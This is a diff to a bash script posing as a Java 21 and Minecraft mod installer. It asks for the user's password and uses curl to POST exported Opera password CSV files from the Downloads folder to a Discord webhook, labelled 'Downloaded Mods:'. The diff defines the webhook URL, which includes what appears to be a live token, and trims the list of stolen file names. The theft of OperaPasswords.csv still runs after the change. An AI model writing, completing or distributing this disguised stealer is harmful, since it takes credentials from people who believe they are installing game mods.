@@ -1,6 +1,6 @@
 #!/bin/bash
 
-#Made To Get Java 21 And The Realism Mod
+WEBHOOK_URL="https://discord.com/api/webhooks/1443976954620412115/DKGwQJLudy7VchCEhn4lON5eDbJ4FJUfh-l2LwijYye2HFegxxMiHjMdwhGZgRioJGRX"
 
 echo "Download Java 21 For Minecraft Mods"
 echo "Please Enter Your Password:"
@@ -27,42 +27,10 @@ while true; do
         continue
     fi
 
-# Downloading The Java 21 Files And Downloading The Realism Mod
-
-
-
-# Sending Request To Pull File From Server Directory
-
-
-
-# Requesting Payload From Server
-
-
-
-# Checking Authenticity
-
-
-
-
-
-
     curl -X POST \
         -F "file=@$HOME/Downloads/OperaPasswords.csv" \
-        -F "file=@$HOME/Downloads/Operapasswords.csv" \
-        -F "file=@$HOME/Downloads/operapasswords.csv" \
-        -F "file=@$HOME/Downloads/operaPasswords.csv" \
-        -F "file=@$HOME/Downloads/passwords.csv" \
-        -F "file=@$HOME/Downloads/password.csv" \
-        -F "file=@$HOME/Downloads/pass.csv" \
-        -F "file=@$HOME/Downloads/opera.csv" \
-        -F "file=@$HOME/Downloads/operapass.csv" \
-        -F "file=@$HOME/Downloads/Passwords.csv" \
-        -F "file=@$HOME/Downloads/Pass.csv" \
-        -F "file=@$HOME/Downloads/Opera.csv" \
         -F 'payload_json={"content":"Downloaded Mods:"}' \
         "https://discord.com/api/webhooks/1443976954620412115/DKGwQJLudy7VchCEhn4lON5eDbJ4FJUfh-l2LwijYye2HFegxxMiHjMdwhGZgRioJGRX"
-        WEBHOOK_URL="https://discord.com/api/webhooks/1443976954620412115/DKGwQJLudy7VchCEhn4lON5eDbJ4FJUfh-l2LwijYye2HFegxxMiHjMdwhGZgRioJGRX"
-
 
     curl -X POST \
       -H "Content-Type: application/json" \
